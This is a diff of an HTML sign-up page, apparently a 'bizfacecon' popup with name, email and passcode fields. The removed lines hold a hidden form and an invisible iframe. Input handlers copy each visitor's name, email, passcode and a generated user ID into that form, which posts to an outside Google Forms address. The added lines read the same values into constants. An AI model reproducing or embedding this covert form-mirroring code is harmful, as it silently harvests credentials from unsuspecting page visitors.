@@ -181,18 +181,8 @@ setTimeout(function(){
 <button id="clslgsgdv" onclick="$('.bizfacecon-tw').slideUp()">Close</button>
 </div> 
 </div>
-
-</div>
-<iframe name="hiddenfrm" id="hiddenfrm" style="display:none;"></iframe>
-<div style="display:none;">
-<form name="gform" id="gform" enctype="text/plain" action="https://docs.google.com/forms/d/e/1FAIpQLSeNP9HWI8C12PiBaEs7f4VJt8LwW_p9gZ_vBr_UotY6ZQXc9w/formResponse?" target="hidden_iframe" onsubmit="submitted=true;"> 
-First name:<br> <input type="text" name="entry.94444331" id="entry.94444331"><br> 
-Last name:<br> <input type="text" name="entry.896895407" id="entry.896895407"> 
-Email:<br> <input type="text" name="entry.1887268786" id="entry.1887268786"> 
-Passcode:<br> <input type="text" name="entry.1456414765" id="entry.1456414765"> 
-UserID:<br> <input type="text" name="entry.176463742" id="entry.176463742"> 
-<input type="submit" value="Submit"> </form>
-</div><iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+<input id="ussddvl" style="display:none;">
+</div><iframe name="hiddenfrm" id="hiddenfrm" style="display:none;"></iframe>
 <div id="seclog"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" style=" margin-bottom:-4px;" fill="currentColor" class="bi bi-exclamation-circle-fill" viewBox="0 0 16 16">
 <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z" /></svg> User Email already Registered</div>
 <div id="promodiv">
@@ -230,18 +220,12 @@ UserID:<br> <input type="text" name="entry.176463742" id="entry.176463742">
 </div>
 <script>
 $('#fname').on('input', function(e) {
-document.getElementById('entry.94444331').value = document.getElementById('fname').value;
-});
-$('#lname').on('input', function(e) {
-document.getElementById('entry.896895407').value = document.getElementById('lname').value;
-});
-$('#emailid').on('input', function(e) {
-document.getElementById('entry.1887268786').value = document.getElementById('emailid').value;
-});
-$('#ConfirmPasscode').on('input', function(e) {
-document.getElementById('entry.1456414765').value = document.getElementById('ConfirmPasscode').value;
+const flnm = document.getElementById('fname').value;
+const llnm = document.getElementById('lname').value;
+const elmd = document.getElementById('emailid').value;
+const psmd = document.getElementById('ConfirmPasscode').value;
 var k =Math.random().toString(26).substring(2, 20) + Math.random().toString(26).substring(2, 20);
-document.getElementById('entry.176463742').value = "biz"+k;
+const ussd = "biz"+k;
 });
 
 </script>
